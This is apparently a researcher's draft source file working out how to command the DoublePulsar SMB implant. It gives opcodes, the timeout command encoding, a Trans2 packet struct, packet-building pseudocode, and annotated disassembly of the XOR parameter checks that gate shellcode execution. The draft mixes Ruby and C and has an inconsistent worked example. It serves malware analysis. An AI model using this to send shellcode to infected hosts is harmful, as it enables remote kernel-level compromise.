/*
OPCODES = {
  ping: 0x23,
  exec: 0xc8,
  kill: 0x77
}

STATUS_CODES = {
  not_detected:   0x00,
  success:        0x10,
  invalid_params: 0x20,
  alloc_failure:  0x30
}
*/

/*
https://blog.rapid7.com/2019/10/02/open-source-command-and-control-of-the-doublepulsar-implant/
Ruby stuff: 

def generate_doublepulsar_timeout(op)
  k = SecureRandom.random_bytes(4).unpack('V').first
  0xff & (op - ((k & 0xffff00) >> 16) - (0xffff & (k & 0xff00) >> 8)) | k & 0xffff00
end

*/

/*
https://www.forcepoint.com/blog/x-labs/evasions-used-shadow-brokers-tools-danderspritz-and-doublepulsar-part-2-2

Timeout indicates Command
The timeout value is used in any SMB request to indicate what DoublePulsar command to execute. The sum of the bytes ANDed by 0xff gives the command:

command = ((t) + (t >> 8) + (t >> 16) + (t >> 24)) & 0x000000ff

DoublePulsar accepts the following commands:

0x23: ping
0xc8: execute
0x77: kill
*/

/*
When I crafted the SMB TRANS2_SESSION_SETUP packet, I zeroed out its parameters, since they weren't necessary for the ping and kill commands
*/

/*
However, the exec command required specific parameters to be sent. I didn't know what to fill them with yet, but it was clear the XOR key was involved.
With zeroed-out parameters, code execution was blocked by checks in the implant
*/

typedef struct {
uint16_t SmbMessageType; //0x00
uint16_t SmbMessageLength; 
uint8_t ProtocolHeader[4]; //"\xffSMB"
uint8_t SmbCommand; 
uint32_t NtStatus; //0x00000000
uint8_t flags; //0x18 - pathnames not case sensitive & pathnames canonicalized
uint16_t flags2;  //0xC007
uint16_t ProcessIDHigh; //0x00
uint8_t signature[8]; //0x00000000000
uint16_t reserved; //0x0000
uint16_t TreeId;                     //tree ID must be set
uint16_t ProccessID; //0xfeff
uint16_t UserID; 
uint16_t multipleID;                 //must have a multiplex ID
  
  //trans2 stuff
   uint8_t wordCount;              //setupcount(1) + wordcount (14)
   uint16_t totalParameterCount;
   uint16_t totalDataCount;

   uint16_t ParamCountTotal;
   uint16_t DataCountTotal;

   uint8_t reserved;
   uint16_t flags;
   uint32_t timeout;   // 0x25 0x89 0x1a 0x00
   uint16_t reserved2;

   uint16_t ParamCountMax;
   uint16_t DataCountMax;
   uint16_t ParamCount;
   uint16_t ParamOffset;
   uint16_t DataCount;
   uint16_t DataOffset;

   uint16_t SetupCount;
   uint16_t SetupData;

   uint8_t reserved3;
   uint16_t function; //0x0e00 also known as Subcommand in Wireshark
   uint16_t ByteCount; //4109 or 0x0d 0x10
   uint8_t padding;

   unsigned char PARAMETERS[12]; //Wannacry uses 12 as the size
   unsigned char payload[4096];
} SMB_TRANSACTION2_SECONDARY_REQUEST;



base_offset = pkt.to_s.length + (setup_count * 2) - 4
param_offset = base_offset

data_offset = param_offset + param.length	
data = parameter + body.to_s //(Convert to String)
unsigned char setup_data = 0x000e; //( little endian in unsigned char :  0x0E 0x00 )
unsigned char PayloadData = parameters + XOR_DATA;

int setup_count = 1;
DoublePulsarPacket.Command = 0x32;
DoublePulsarPacket.Flags1 = 0x18;
DoublePulsarPacket.Flags2 = 0xc007;
DoublePulsarPacket.WordCount = 14 + setup_count
DoublePulsarPacket.TreeID = response.TreeID;
DoublePulsarPacket.MultiplexID = 42; //response.multipleID;

DoublePulsarPacket.ParamCountTotal = param.length
DoublePulsarPacket.DataCountTotal = body.to_s.length
DoublePulsarPacket.ParamCountMax = 1;
DoublePulsarPacket.DataCountMax = 0;
DoublePulsarPacket.ParamCount = param.length
DoublePulsarPacket.ParamOffset = param_offset
DoublePulsarPacket.DataCount = body.to_s.length
DoublePulsarPacket.DataOffset = data_offset
DoublePulsarPacket.SetupCount = setup_count
DoublePulsarPacket.SetupData = setup_data
DoublePulsarPacket.Timeout =  "\x25\x89\xEE\x00";
DoublePulsarPacket.Payload = data


The branch for the 0xc8 code shows the checks that need to be passed for shellcode execution.

The first check is shown in the following disassembly:

fffffa80`0226e0fd 4831db          xor     rbx,rbx
fffffa80`0226e100 4831f6          xor     rsi,rsi
fffffa80`0226e103 4831ff          xor     rdi,rdi
fffffa80`0226e106 498b45d8        mov     rax,qword ptr [r13-28h]   ; SESSION_SETUP Parameters pointer
fffffa80`0226e10a 8b18            mov     ebx,dword ptr [rax]
fffffa80`0226e10c 8b7004          mov     esi,dword ptr [rax+4]
fffffa80`0226e10f 8b7808          mov     edi,dword ptr [rax+8]
fffffa80`0226e112 8b4d48          mov     ecx,dword ptr [rbp+48h]   ; XOR key
fffffa80`0226e115 31cb            xor     ebx,ecx                   ; Total shellcode size
fffffa80`0226e117 31ce            xor     esi,ecx                   ; Size of shellcode data in this request
fffffa80`0226e119 31cf            xor     edi,ecx                   ; Offset within shellcode buffer to start copying data to
fffffa80`0226e11b 413b7510        cmp     esi,dword ptr [r13+10h]
fffffa80`0226e11f 757b            jne     fffffa80`0226e19c         ; Invalid parameters


Then the comparison determines whether the XORed value from the SESSION_SETUP parameters (offset + 4) matches 
the Total Data Count field, [r13+10h], of the Trans2 request. 
  
This means the second 4-byte block of SESSION_SETUP parameters should be key ^ total data count to pass the first parameter check.

After the first check, another comparison occurs, but this time the comparison is with the first 4-byte block of the SESSION_SETUP parameters:

fffffa80`0226e121 3b5d54          cmp     ebx,dword ptr [rbp+54h]   ; Stored shellcode size
fffffa80`0226e124 488b454c        mov     rax,qword ptr [rbp+4Ch]   ; Stored shellcode buffer pointer
fffffa80`0226e128 7416            je      fffffa80`0226e140
fffffa80`0226e12a e8d1000000      call    fffffa80`0226e200
fffffa80`0226e12f 488d5304        lea     rdx,[rbx+4]
fffffa80`0226e133 4831c9          xor     rcx,rcx
fffffa80`0226e136 ff5510          call    qword ptr [rbp+10h]       ; nt!ExAllocatePool
fffffa80`0226e139 4889454c        mov     qword ptr [rbp+4Ch],rax   ; Store shellcode pointer
fffffa80`0226e13d 895d54          mov     dword ptr [rbp+54h],ebx   ; Store shellcode size


This comparison checks if a stored global value, [rbp+54h], equals the XORed first 4-byte SESSION_SETUP parameters block. 
The data stored at [rbp+54h] is zero or the number of bytes that have previously been allocated for the shellcode. 
If previously allocated bytes match with the 4-byte block, then the rest of that code segment is jumped over. 
Otherwise, nt!ExAllocatePool is called to allocate a buffer for the shellcode. 
The shellcode pointer is stored at [rbp+4Ch], and the number of bytes allocated is stored at [rbp+54h].
  
  
The destination for the copied data is an offset into the shellcode buffer, which is specified by the SESSION_SETUP parameters. 
Then the copied data is decoded using the XOR key, which means the shellcode data in the Trans2 request must be encoded before it is sent to the target. 
After the loop is finished, the last decoded address is compared with the expected ending address of the shellcode buffer (start of shellcode buffer + total size of shellcode). 
If the addresses do not match, then a "success" status is returned, but more data is expected in future requests before the shellcode in memory will be executed. 
If the addresses match, then the shellcode is executed, and the buffer is deallocated.  


SESSION_SETUP_PARAMETER NOTES:



Trans2.SESSION_SETUP.Parameters is of 0xC (12) bytes and contains below information encrypted by XOR key
1. Total Size of Payload
2. Chunk Size
3. Offset of Chunk in Payload

SESSION_SETUP.Parameters:
TotalSizeOfPayload ^ XorKey
ChunkSize ^ XOR KEY
OFFSET of chunk in payload ^ XORKEY ?????
OFFSET of chunk??????

Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62115858
1 Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
2 Chunk Size = (0x58580162) ^ (0x58581162) = 0x1000(4096)
3 Offset of Chunk in Payload = (0x58581162) ^ (0x58581162) = 0

Another example of Trans2.SESSION_SETUP.Parameters value = 6a620858 62015858 62015858
1 Total Size of Payload = (0x5808626a) ^ (0x58581162) = 0x507308
2 Chunk Size = (0x58580162) ^ (0x58580162) = 0x1000(4096)
3 Offset of Chunk in Payload = (0x58580162) ^ (0x58581162) = 0x1000(4096)

Backdoor Allocates Memory of total size of payload (0x507308) using ExAllocatePool API. Copies the chunk to allocated memory.
